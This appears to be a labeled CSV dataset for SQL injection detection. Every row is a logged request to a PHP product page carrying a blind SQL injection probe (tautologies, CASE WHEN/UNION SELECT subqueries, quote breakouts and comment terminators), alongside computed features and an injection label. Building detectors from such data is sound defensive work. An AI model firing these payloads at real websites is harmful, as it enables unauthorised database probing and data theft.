full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x52684771%20WHERE%207341%3D7341%20OR%20NOT%205387%3D5387%29%2B%27,/details.php?prod=5&type=?'+(SELECT 0x52684771 WHERE 7341=7341 OR NOT 5387=5387)+',192.168.43.6,1681395122.592097,4,58,97.8,4,13.793103448275861,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x554f455a%20FROM%20DUAL%20WHERE%202420%3D2420%20OR%20NOT%201270%3D2832%29%7C%7C,/details.php?prod=5&type=?||(SELECT 0x554f455a FROM DUAL WHERE 2420=2420 OR NOT 1270=2832)||,192.168.43.6,1681395122.596346,5,68,97.8,3,11.764705882352942,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x4a755150%20FROM%20DUAL%20WHERE%208319%3D8319%20OR%20NOT%205387%3D5387%29%7C%7C,/details.php?prod=5&type=?||(SELECT 0x4a755150 FROM DUAL WHERE 8319=8319 OR NOT 5387=5387)||,192.168.43.6,1681395122.599683,5,68,97.8,3,11.764705882352942,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x7a687744%20WHERE%205753%3D5753%20OR%20NOT%206453%3D4622%29%7C%7C,/details.php?prod=5&type=?||(SELECT 0x7a687744 WHERE 5753=5753 OR NOT 6453=4622)||,192.168.43.6,1681395122.604086,4,58,97.8,3,12.068965517241379,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x41594462%20WHERE%209634%3D9634%20OR%20NOT%205387%3D5387%29%7C%7C,/details.php?prod=5&type=?||(SELECT 0x41594462 WHERE 9634=9634 OR NOT 5387=5387)||,192.168.43.6,1681395122.6078,4,58,97.8,3,12.068965517241379,1
/details.php?prod=5&type=%3F%2B%28SELECT%20xCte%20WHERE%207461%3D7461%20OR%20NOT%207300%3D8658%29%2B,/details.php?prod=5&type=?+(SELECT xCte WHERE 7461=7461 OR NOT 7300=8658)+,192.168.43.6,1681395122.611481,4,50,97.8,3,14.0,1
/details.php?prod=5&type=%3F%2B%28SELECT%20fjnC%20WHERE%204823%3D4823%20OR%20NOT%205387%3D5387%29%2B,/details.php?prod=5&type=?+(SELECT fjnC WHERE 4823=4823 OR NOT 5387=5387)+,192.168.43.6,1681395122.615221,4,50,97.8,3,14.0,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x794e6559%20WHERE%202197%3D2197%20OR%20NOT%209826%3D9316%29%2B,/details.php?prod=5&type=?+(SELECT 0x794e6559 WHERE 2197=2197 OR NOT 9826=9316)+,192.168.43.6,1681395122.619142,4,56,97.8,3,12.5,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x64567475%20WHERE%205154%3D5154%20OR%20NOT%205387%3D5387%29%2B,/details.php?prod=5&type=?+(SELECT 0x64567475 WHERE 5154=5154 OR NOT 5387=5387)+,192.168.43.6,1681395122.622503,4,56,97.8,3,12.5,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20ipTX%20WHERE%202294%3D2294%20OR%20NOT%203233%3D1773--%20vgyG,/details.php?prod=5&type=?')) AS ipTX WHERE 2294=2294 OR NOT 3233=1773-- vgyG,192.168.43.6,1681395122.626633,4,53,97.8,4,15.09433962264151,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20hgjw%20WHERE%206164%3D6164%20OR%20NOT%205387%3D5387--%20FaIr,/details.php?prod=5&type=?')) AS hgjw WHERE 6164=6164 OR NOT 5387=5387-- FaIr,192.168.43.6,1681395122.630432,4,53,97.8,4,15.09433962264151,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20kJaN%20WHERE%202921%3D2921%20OR%20NOT%203802%3D7544--%20XEnU,"/details.php?prod=5&type=?"")) AS kJaN WHERE 2921=2921 OR NOT 3802=7544-- XEnU",192.168.43.6,1681395122.634208,4,53,97.8,4,15.09433962264151,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20Dkrh%20WHERE%205182%3D5182%20OR%20NOT%205387%3D5387--%20ndff,"/details.php?prod=5&type=?"")) AS Dkrh WHERE 5182=5182 OR NOT 5387=5387-- ndff",192.168.43.6,1681395122.637632,4,53,97.8,4,15.09433962264151,1
/details.php?prod=5&type=%3F%29%29%20AS%20ZOzO%20WHERE%202856%3D2856%20OR%20NOT%209202%3D7387--%20NreR,/details.php?prod=5&type=?)) AS ZOzO WHERE 2856=2856 OR NOT 9202=7387-- NreR,192.168.43.6,1681395122.64209,4,52,97.8,3,13.461538461538462,1
/details.php?prod=5&type=%3F%29%29%20AS%20yJcE%20WHERE%208023%3D8023%20OR%20NOT%205387%3D5387--%20itin,/details.php?prod=5&type=?)) AS yJcE WHERE 8023=8023 OR NOT 5387=5387-- itin,192.168.43.6,1681395122.64516,4,52,97.8,3,13.461538461538462,1
/details.php?prod=5&type=%3F%27%29%20AS%20uiIz%20WHERE%206175%3D6175%20OR%20NOT%206518%3D9882--%20ZoRv,/details.php?prod=5&type=?') AS uiIz WHERE 6175=6175 OR NOT 6518=9882-- ZoRv,192.168.43.6,1681395122.649143,4,52,97.8,4,15.384615384615385,1
/details.php?prod=5&type=%3F%27%29%20AS%20GrTB%20WHERE%209628%3D9628%20OR%20NOT%205387%3D5387--%20ptIy,/details.php?prod=5&type=?') AS GrTB WHERE 9628=9628 OR NOT 5387=5387-- ptIy,192.168.43.6,1681395122.653325,4,52,97.8,4,15.384615384615385,1
/details.php?prod=5&type=%3F%22%29%20AS%20vOtF%20WHERE%209578%3D9578%20OR%20NOT%202553%3D2547--%20qTtn,"/details.php?prod=5&type=?"") AS vOtF WHERE 9578=9578 OR NOT 2553=2547-- qTtn",192.168.43.6,1681395122.65681,4,52,97.8,4,15.384615384615385,1
/details.php?prod=5&type=%3F%22%29%20AS%20FFPN%20WHERE%208897%3D8897%20OR%20NOT%205387%3D5387--%20qRjD,"/details.php?prod=5&type=?"") AS FFPN WHERE 8897=8897 OR NOT 5387=5387-- qRjD",192.168.43.6,1681395122.660229,4,52,97.8,4,15.384615384615385,1
/details.php?prod=5&type=%3F%29%20AS%20BVSX%20WHERE%203450%3D3450%20OR%20NOT%204102%3D6039--%20GbgN,/details.php?prod=5&type=?) AS BVSX WHERE 3450=3450 OR NOT 4102=6039-- GbgN,192.168.43.6,1681395122.664701,4,51,97.8,3,13.72549019607843,1
/details.php?prod=5&type=%3F%29%20AS%20BNjB%20WHERE%207415%3D7415%20OR%20NOT%205387%3D5387--%20dPjt,/details.php?prod=5&type=?) AS BNjB WHERE 7415=7415 OR NOT 5387=5387-- dPjt,192.168.43.6,1681395122.667839,4,51,97.8,3,13.72549019607843,1
/details.php?prod=5&type=%3F%60%20WHERE%201797%3D1797%20OR%20NOT%203151%3D7840--%20DBYZ,/details.php?prod=5&type=?` WHERE 1797=1797 OR NOT 3151=7840-- DBYZ,192.168.43.6,1681395122.672126,3,43,97.8,2,11.627906976744185,1
/details.php?prod=5&type=%3F%60%20WHERE%202104%3D2104%20OR%20NOT%205387%3D5387--%20zGDL,/details.php?prod=5&type=?` WHERE 2104=2104 OR NOT 5387=5387-- zGDL,192.168.43.6,1681395122.675734,3,43,97.8,2,11.627906976744185,1
/details.php?prod=5&type=%3F%60%29%20WHERE%207740%3D7740%20OR%20NOT%206336%3D5721--%20fvXv,/details.php?prod=5&type=?`) WHERE 7740=7740 OR NOT 6336=5721-- fvXv,192.168.43.6,1681395122.67926,3,44,97.8,3,13.636363636363637,1
/details.php?prod=5&type=%3F%60%29%20WHERE%206717%3D6717%20OR%20NOT%205387%3D5387--%20jExU,/details.php?prod=5&type=?`) WHERE 6717=6717 OR NOT 5387=5387-- jExU,192.168.43.6,1681395122.683093,3,44,97.8,3,13.636363636363637,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20OR%20NOT%203607%3D6441%23,/details.php?prod=5&type=?' IN BOOLEAN MODE) OR NOT 3607=6441#,192.168.43.6,1681395122.687075,3,38,97.8,4,18.42105263157895,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20OR%20NOT%205387%3D5387%23,/details.php?prod=5&type=?' IN BOOLEAN MODE) OR NOT 5387=5387#,192.168.43.6,1681395122.690221,3,38,97.8,4,18.42105263157895,1
/details.php?prod=5&type=%3F%29%20AND%202503%3D%28SELECT%20%28CASE%20WHEN%20%282503%3D5499%29%20THEN%202503%20ELSE%20%28SELECT%205499%20UNION%20SELECT%204059%29%20END%29%29--%20-,/details.php?prod=5&type=?) AND 2503=(SELECT (CASE WHEN (2503=5499) THEN 2503 ELSE (SELECT 5499 UNION SELECT 4059) END))-- -,192.168.43.6,1681395122.694991,5,100,97.8,4,9.0,1
/details.php?prod=5&type=%3F%29%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?) AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.699235,5,100,97.8,4,9.0,1
/details.php?prod=5&type=%3F%27%29%20AND%209023%3D%28SELECT%20%28CASE%20WHEN%20%289023%3D1431%29%20THEN%209023%20ELSE%20%28SELECT%201431%20UNION%20SELECT%209246%29%20END%29%29--%20-,/details.php?prod=5&type=?') AND 9023=(SELECT (CASE WHEN (9023=1431) THEN 9023 ELSE (SELECT 1431 UNION SELECT 9246) END))-- -,192.168.43.6,1681395122.703028,5,101,97.8,5,9.900990099009901,1
/details.php?prod=5&type=%3F%27%29%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?') AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.708015,5,101,97.8,5,9.900990099009901,1
/details.php?prod=5&type=%3F%27%20AND%209191%3D%28SELECT%20%28CASE%20WHEN%20%289191%3D4763%29%20THEN%209191%20ELSE%20%28SELECT%204763%20UNION%20SELECT%209232%29%20END%29%29--%20-,/details.php?prod=5&type=?' AND 9191=(SELECT (CASE WHEN (9191=4763) THEN 9191 ELSE (SELECT 4763 UNION SELECT 9232) END))-- -,192.168.43.6,1681395122.714364,5,100,97.8,5,10.0,1
/details.php?prod=5&type=%3F%27%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?' AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.723983,5,100,97.8,5,10.0,1
/details.php?prod=5&type=%3F%22%20AND%201787%3D%28SELECT%20%28CASE%20WHEN%20%281787%3D7144%29%20THEN%201787%20ELSE%20%28SELECT%207144%20UNION%20SELECT%205872%29%20END%29%29--%20-,"/details.php?prod=5&type=?"" AND 1787=(SELECT (CASE WHEN (1787=7144) THEN 1787 ELSE (SELECT 7144 UNION SELECT 5872) END))-- -",192.168.43.6,1681395122.731285,5,100,97.8,5,10.0,1
/details.php?prod=5&type=%3F%22%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,"/details.php?prod=5&type=?"" AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -",192.168.43.6,1681395122.737875,5,100,97.8,5,10.0,1
/details.php?prod=5&type=%3F%29%29%20AND%209113%3D%28SELECT%20%28CASE%20WHEN%20%289113%3D5651%29%20THEN%209113%20ELSE%20%28SELECT%205651%20UNION%20SELECT%201275%29%20END%29%29--%20-,/details.php?prod=5&type=?)) AND 9113=(SELECT (CASE WHEN (9113=5651) THEN 9113 ELSE (SELECT 5651 UNION SELECT 1275) END))-- -,192.168.43.6,1681395122.74299,5,101,97.8,4,8.910891089108912,1
/details.php?prod=5&type=%3F%29%29%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?)) AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.754118,5,101,97.8,4,8.910891089108912,1
/details.php?prod=5&type=%3F%29%29%29%20AND%209794%3D%28SELECT%20%28CASE%20WHEN%20%289794%3D3752%29%20THEN%209794%20ELSE%20%28SELECT%203752%20UNION%20SELECT%201505%29%20END%29%29--%20-,/details.php?prod=5&type=?))) AND 9794=(SELECT (CASE WHEN (9794=3752) THEN 9794 ELSE (SELECT 3752 UNION SELECT 1505) END))-- -,192.168.43.6,1681395122.759002,5,102,97.8,4,8.823529411764707,1
/details.php?prod=5&type=%3F%29%29%29%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?))) AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.80159,5,102,97.8,4,8.823529411764707,1
/details.php?prod=5&type=%3F%20AND%209482%3D%28SELECT%20%28CASE%20WHEN%20%289482%3D1027%29%20THEN%209482%20ELSE%20%28SELECT%201027%20UNION%20SELECT%201658%29%20END%29%29--%20-,/details.php?prod=5&type=? AND 9482=(SELECT (CASE WHEN (9482=1027) THEN 9482 ELSE (SELECT 1027 UNION SELECT 1658) END))-- -,192.168.43.6,1681395122.806464,5,99,97.8,4,9.090909090909092,1
/details.php?prod=5&type=%3F%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=? AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.810062,5,99,97.8,4,9.090909090909092,1
/details.php?prod=5&type=%3F%27%29%29%20AND%208836%3D%28SELECT%20%28CASE%20WHEN%20%288836%3D9129%29%20THEN%208836%20ELSE%20%28SELECT%209129%20UNION%20SELECT%205564%29%20END%29%29--%20-,/details.php?prod=5&type=?')) AND 8836=(SELECT (CASE WHEN (8836=9129) THEN 8836 ELSE (SELECT 9129 UNION SELECT 5564) END))-- -,192.168.43.6,1681395122.814257,5,102,97.8,5,9.803921568627452,1
/details.php?prod=5&type=%3F%27%29%29%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?')) AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.81777,5,102,97.8,5,9.803921568627452,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%202616%3D%28SELECT%20%28CASE%20WHEN%20%282616%3D8018%29%20THEN%202616%20ELSE%20%28SELECT%208018%20UNION%20SELECT%201251%29%20END%29%29--%20-,/details.php?prod=5&type=?'))) AND 2616=(SELECT (CASE WHEN (2616=8018) THEN 2616 ELSE (SELECT 8018 UNION SELECT 1251) END))-- -,192.168.43.6,1681395122.866402,5,103,97.8,5,9.70873786407767,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?'))) AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.870292,5,103,97.8,5,9.70873786407767,1
/details.php?prod=5&type=%3F%25%27%20AND%203763%3D%28SELECT%20%28CASE%20WHEN%20%283763%3D3874%29%20THEN%203763%20ELSE%20%28SELECT%203874%20UNION%20SELECT%201519%29%20END%29%29--%20-,/details.php?prod=5&type=?%' AND 3763=(SELECT (CASE WHEN (3763=3874) THEN 3763 ELSE (SELECT 3874 UNION SELECT 1519) END))-- -,192.168.43.6,1681395122.876017,5,101,97.8,5,9.900990099009901,1
/details.php?prod=5&type=%3F%25%27%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?%' AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.879438,5,101,97.8,5,9.900990099009901,1
/details.php?prod=5&type=%3F%22%29%20AND%204271%3D%28SELECT%20%28CASE%20WHEN%20%284271%3D5483%29%20THEN%204271%20ELSE%20%28SELECT%205483%20UNION%20SELECT%209818%29%20END%29%29--%20-,"/details.php?prod=5&type=?"") AND 4271=(SELECT (CASE WHEN (4271=5483) THEN 4271 ELSE (SELECT 5483 UNION SELECT 9818) END))-- -",192.168.43.6,1681395122.884129,5,101,97.8,5,9.900990099009901,1
/details.php?prod=5&type=%3F%22%29%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,"/details.php?prod=5&type=?"") AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -",192.168.43.6,1681395122.901822,5,101,97.8,5,9.900990099009901,1
/details.php?prod=5&type=%3F%22%29%29%20AND%204552%3D%28SELECT%20%28CASE%20WHEN%20%284552%3D7824%29%20THEN%204552%20ELSE%20%28SELECT%207824%20UNION%20SELECT%209966%29%20END%29%29--%20-,"/details.php?prod=5&type=?"")) AND 4552=(SELECT (CASE WHEN (4552=7824) THEN 4552 ELSE (SELECT 7824 UNION SELECT 9966) END))-- -",192.168.43.6,1681395122.906891,5,102,97.8,5,9.803921568627452,1
/details.php?prod=5&type=%3F%22%29%29%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,"/details.php?prod=5&type=?"")) AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -",192.168.43.6,1681395122.911256,5,102,97.8,5,9.803921568627452,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%204835%3D%28SELECT%20%28CASE%20WHEN%20%284835%3D8961%29%20THEN%204835%20ELSE%20%28SELECT%208961%20UNION%20SELECT%202076%29%20END%29%29--%20-,"/details.php?prod=5&type=?""))) AND 4835=(SELECT (CASE WHEN (4835=8961) THEN 4835 ELSE (SELECT 8961 UNION SELECT 2076) END))-- -",192.168.43.6,1681395122.916566,5,103,97.8,5,9.70873786407767,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,"/details.php?prod=5&type=?""))) AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -",192.168.43.6,1681395122.920771,5,103,97.8,5,9.70873786407767,1
/details.php?prod=5&type=%3F%27%29%20WHERE%205168%3D5168%20AND%207867%3D%28SELECT%20%28CASE%20WHEN%20%287867%3D5304%29%20THEN%207867%20ELSE%20%28SELECT%205304%20UNION%20SELECT%202761%29%20END%29%29--%20-,/details.php?prod=5&type=?') WHERE 5168=5168 AND 7867=(SELECT (CASE WHEN (7867=5304) THEN 7867 ELSE (SELECT 5304 UNION SELECT 2761) END))-- -,192.168.43.6,1681395122.926928,6,117,97.8,5,9.401709401709402,1
/details.php?prod=5&type=%3F%27%29%20WHERE%207345%3D7345%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?') WHERE 7345=7345 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.932281,6,117,97.8,5,9.401709401709402,1
/details.php?prod=5&type=%3F%22%29%20WHERE%207313%3D7313%20AND%208367%3D%28SELECT%20%28CASE%20WHEN%20%288367%3D6994%29%20THEN%208367%20ELSE%20%28SELECT%206994%20UNION%20SELECT%206081%29%20END%29%29--%20-,"/details.php?prod=5&type=?"") WHERE 7313=7313 AND 8367=(SELECT (CASE WHEN (8367=6994) THEN 8367 ELSE (SELECT 6994 UNION SELECT 6081) END))-- -",192.168.43.6,1681395122.937195,6,117,97.8,5,9.401709401709402,1
/details.php?prod=5&type=%3F%22%29%20WHERE%201448%3D1448%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,"/details.php?prod=5&type=?"") WHERE 1448=1448 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -",192.168.43.6,1681395122.940599,6,117,97.8,5,9.401709401709402,1
/details.php?prod=5&type=%3F%29%20WHERE%205739%3D5739%20AND%202341%3D%28SELECT%20%28CASE%20WHEN%20%282341%3D2072%29%20THEN%202341%20ELSE%20%28SELECT%202072%20UNION%20SELECT%201820%29%20END%29%29--%20-,/details.php?prod=5&type=?) WHERE 5739=5739 AND 2341=(SELECT (CASE WHEN (2341=2072) THEN 2341 ELSE (SELECT 2072 UNION SELECT 1820) END))-- -,192.168.43.6,1681395122.944913,6,116,97.8,4,8.620689655172415,1
/details.php?prod=5&type=%3F%29%20WHERE%209594%3D9594%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?) WHERE 9594=9594 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.948654,6,116,97.8,4,8.620689655172415,1
/details.php?prod=5&type=%3F%27%20WHERE%202301%3D2301%20AND%208553%3D%28SELECT%20%28CASE%20WHEN%20%288553%3D4890%29%20THEN%208553%20ELSE%20%28SELECT%204890%20UNION%20SELECT%206949%29%20END%29%29--%20-,/details.php?prod=5&type=?' WHERE 2301=2301 AND 8553=(SELECT (CASE WHEN (8553=4890) THEN 8553 ELSE (SELECT 4890 UNION SELECT 6949) END))-- -,192.168.43.6,1681395122.953119,6,116,97.8,5,9.482758620689655,1
/details.php?prod=5&type=%3F%27%20WHERE%202171%3D2171%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?' WHERE 2171=2171 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.95781,6,116,97.8,5,9.482758620689655,1
/details.php?prod=5&type=%3F%22%20WHERE%208939%3D8939%20AND%206674%3D%28SELECT%20%28CASE%20WHEN%20%286674%3D3360%29%20THEN%206674%20ELSE%20%28SELECT%203360%20UNION%20SELECT%201625%29%20END%29%29--%20-,"/details.php?prod=5&type=?"" WHERE 8939=8939 AND 6674=(SELECT (CASE WHEN (6674=3360) THEN 6674 ELSE (SELECT 3360 UNION SELECT 1625) END))-- -",192.168.43.6,1681395122.9623,6,116,97.8,5,9.482758620689655,1
/details.php?prod=5&type=%3F%22%20WHERE%204418%3D4418%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,"/details.php?prod=5&type=?"" WHERE 4418=4418 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -",192.168.43.6,1681395122.965424,6,116,97.8,5,9.482758620689655,1
/details.php?prod=5&type=%3F%20WHERE%206487%3D6487%20AND%204524%3D%28SELECT%20%28CASE%20WHEN%20%284524%3D3770%29%20THEN%204524%20ELSE%20%28SELECT%203770%20UNION%20SELECT%203388%29%20END%29%29--%20-,/details.php?prod=5&type=? WHERE 6487=6487 AND 4524=(SELECT (CASE WHEN (4524=3770) THEN 4524 ELSE (SELECT 3770 UNION SELECT 3388) END))-- -,192.168.43.6,1681395122.969641,6,115,97.8,4,8.695652173913043,1
/details.php?prod=5&type=%3F%20WHERE%203089%3D3089%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=? WHERE 3089=3089 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.973445,6,115,97.8,4,8.695652173913043,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x72567847%20WHERE%202821%3D2821%20AND%201039%3D%28SELECT%20%28CASE%20WHEN%20%281039%3D4340%29%20THEN%201039%20ELSE%20%28SELECT%204340%20UNION%20SELECT%206363%29%20END%29%29--%20-,/details.php?prod=5&type=?'||(SELECT 0x72567847 WHERE 2821=2821 AND 1039=(SELECT (CASE WHEN (1039=4340) THEN 1039 ELSE (SELECT 4340 UNION SELECT 6363) END))-- -,192.168.43.6,1681395122.977042,6,136,97.8,5,8.088235294117647,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x70485367%20WHERE%202321%3D2321%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?'||(SELECT 0x70485367 WHERE 2321=2321 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.980646,6,136,97.8,5,8.088235294117647,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x6d505069%20FROM%20DUAL%20WHERE%207348%3D7348%20AND%209784%3D%28SELECT%20%28CASE%20WHEN%20%289784%3D2357%29%20THEN%209784%20ELSE%20%28SELECT%202357%20UNION%20SELECT%209041%29%20END%29%29--%20-,/details.php?prod=5&type=?'||(SELECT 0x6d505069 FROM DUAL WHERE 7348=7348 AND 9784=(SELECT (CASE WHEN (9784=2357) THEN 9784 ELSE (SELECT 2357 UNION SELECT 9041) END))-- -,192.168.43.6,1681395122.985041,7,146,97.8,5,8.219178082191782,1
